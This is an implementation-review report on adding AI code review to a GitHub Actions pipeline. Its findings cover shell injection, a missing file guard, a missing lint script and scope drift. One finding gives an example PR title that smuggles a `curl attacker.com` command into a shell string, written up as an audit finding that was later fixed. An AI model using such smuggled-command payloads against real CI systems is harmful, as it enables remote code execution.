<!-- IMPL-REVIEW-REPORT -->
# Implementation Review: Code Review in CI

- **Plan**: context/changes/code-review-in-ci/plan.md
- **Scope**: All Phases (1–3 of 3)
- **Date**: 2026-06-16
- **Verdict**: APPROVED (post-triage — all findings resolved)
- **Findings**: 0 critical  4 warnings  3 observations  |  6 fixed  1 accepted

## Verdicts

| Dimension | Verdict |
|-----------|---------|
| Plan Adherence | WARNING |
| Scope Discipline | WARNING |
| Safety & Quality | WARNING |
| Architecture | PASS |
| Pattern Consistency | PASS |
| Success Criteria | WARNING |

## Findings

### F1 — PR_TITLE interpolated into double-quoted shell string

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Safety & Quality
- **Location**: .github/actions/ai-code-review/action.yml ~L52–63
- **Detail**: PR_TITLE is correctly set via env var from the GitHub expression, but is then embedded into a multi-line double-quoted shell string to build INSTRUCTION. A PR title containing a double-quote or backslash (e.g. `foo" && curl attacker.com && echo "`) breaks the string boundary and executes out-of-band. Since anyone can open a PR, the attack surface is real.
- **Fix A ⭐ Recommended**: Pass PR_TITLE as a separate env var to the tsx invocation rather than embedding it in the shell INSTRUCTION string; the TypeScript reads it from process.env instead.
  - Strength: Removes the injection class entirely; env vars are the standard GitHub Actions pattern for passing untrusted user input.
  - Tradeoff: Small refactor of how render-for-ci.ts or cli.ts receives the PR title; may need a small CLI change too.
  - Confidence: HIGH — env vars are the standard GitHub Actions pattern for passing untrusted user input.
  - Blind spot: Haven't checked whether cli.ts currently reads env vars or only argv; may need a small CLI change too.
- **Fix B**: Use a single-quoted heredoc (`<<'EOF'`) to build INSTRUCTION — no shell expansion occurs, one-line YAML change.
  - Strength: No TypeScript changes needed.
  - Tradeoff: PR_TITLE still ends up in the argv string; easy to regress later if someone edits the block.
  - Confidence: MED — single-quoted heredoc is correct but less idiomatic.
  - Blind spot: Whether npx tsx re-interprets the instruction as a shell command anywhere.
- **Decision**: FIXED via Fix A

### F2 — render-for-ci.ts: readFileSync without file-existence guard

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: packages/code-reviewer/src/render-for-ci.ts ~L16
- **Detail**: readFileSync(jsonPath, "utf8") throws ENOENT if the review agent crashes before writing review.json (e.g. network error, OOM, tsx compilation failure). When this throws, the Render step exits non-zero and the github-script step that posts labels/comments is skipped — leaving the PR with no label and no comment despite the action supposedly succeeding. The null-report fallback only guards against empty/null JSON content, not a missing file.
- **Fix**: Add `existsSync` guard before `readFileSync`: `const raw = existsSync(jsonPath) ? readFileSync(jsonPath, "utf8").trim() : "";` — the existing `raw === ""` branch already writes the error verdict+comment, so this one-line change covers the missing-file case.
- **Decision**: FIXED

### F3 — renderComment meta has no model field despite plan spec

- **Severity**: ⚠️ WARNING
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Plan Adherence
- **Location**: packages/code-reviewer/src/report/comment.ts (meta type)
- **Detail**: Plan §Phase 1 / Change 4 specified "a footer line with model/cost/turns/commit." The renderComment meta parameter has `costUsd?`, `turns?`, `commitSha?` but no `model` field — the footer never shows which model produced the review. render-for-ci.ts does not pass a model value either.
- **Fix**: Add `model?: string` to the meta type, render it in the footer (`Reviewed by ${meta.model ?? "claude"} · ...`), then pass `model: process.env["INPUT_MODEL"] ?? "claude-sonnet-4-6"` from render-for-ci.ts (already available in action env).
- **Decision**: FIXED

### F4 — npm run lint script missing; Phase 1 checkpoint 1.2 unverifiable

- **Severity**: ⚠️ WARNING
- **Impact**: 🔎 MEDIUM — real tradeoff; pause to reason through it
- **Dimension**: Success Criteria
- **Location**: packages/code-reviewer/package.json (no lint script)
- **Detail**: Plan checkbox `[x] 1.2 Lint passes in the package: npm run lint` is marked complete, but packages/code-reviewer has no lint script — only review, dev, smoke, typecheck, build. Running npm run lint exits with "Missing script: lint" (verified). This means 1.2 was rubber-stamped without the command actually succeeding.
- **Fix A ⭐ Recommended**: Add `"lint": "eslint src"` to packages/code-reviewer/package.json scripts, verify it passes, re-run to confirm the checkpoint.
  - Strength: Closes the actual gap — the package now has linting on a par with the root project.
  - Tradeoff: Need to confirm ESLint config is inherited or add a package-level config; small setup cost.
  - Confidence: MED — ESLint is already in the root; whether the package resolves it without local config is untested.
  - Blind spot: Haven't checked if the package has its own eslint config or relies on the root's.
- **Fix B**: Remove checkpoint 1.2 from the plan and accept lint is covered at the root level only.
  - Strength: Zero extra setup; the code is already typechecked and smoked.
  - Tradeoff: The package drifts from the quality contract the plan set out; future changes bypass lint.
  - Confidence: LOW — the plan explicitly listed this as a success criterion; removing it is a scope reduction.
  - Blind spot: Whether CI currently runs lint on the package at all.
- **Decision**: FIXED via Fix A — added eslint + typescript-eslint devDependencies, eslint.config.js, and "lint" script; npm run lint passes.

### F5 — SHA inputs and --model flag interpolated directly into shell

- **Severity**: OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: .github/actions/ai-code-review/action.yml ~L33–36, L69
- **Detail**: `git diff "${{ inputs.base_sha }}...${{ inputs.head_sha }}"` and `--model "${{ inputs.model }}"` are interpolated directly into shell. In practice base_sha/head_sha are always 40-char hex (safe) and model is caller-controlled from the internal workflow (safe). But the pattern is the textbook command-injection surface for composite actions.
- **Fix**: Route base_sha, head_sha, and model through `env:` block vars (BASE_SHA, HEAD_SHA, MODEL) and reference $BASE_SHA etc. in the run: body — same pattern already used for ANTHROPIC_API_KEY and PR_TITLE.
- **Decision**: FIXED

### F6 — src/lib/utils.ts unrelated to this change

- **Severity**: OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Scope Discipline
- **Location**: src/lib/utils.ts
- **Detail**: This file (formatScore utility for drill-session UI) appears in the diff for this change but has zero relation to the CI code review feature. It was either committed on the same branch as a convenience or is residue from a concurrent change that was never split off. No harm done to the feature, but it muddies the change's scope and audit trail.
- **Fix**: Confirm whether this change was intentional; if not, it should have been a separate commit/PR.
- **Decision**: ACCEPTED — already in main (commit 049f435); nothing to move retroactively.

### F7 — costUsd renders as "$NaN" if REVIEW_COST env is non-numeric

- **Severity**: OBSERVATION
- **Impact**: 🏃 LOW — quick decision; fix is obvious and narrowly scoped
- **Dimension**: Safety & Quality
- **Location**: packages/code-reviewer/src/report/comment.ts ~L79
- **Detail**: `meta.costUsd.toFixed(4)` will render "$NaN" in the PR comment footer if upstream passes a non-numeric value. In practice REVIEW_COST is extracted by grep and will be numeric-or-empty (safe), but a defensive guard makes the intent explicit.
- **Fix**: Guard with `Number.isFinite`: `` Number.isFinite(meta.costUsd) ? `$${meta.costUsd.toFixed(4)}` : "N/A" ``
- **Decision**: FIXED
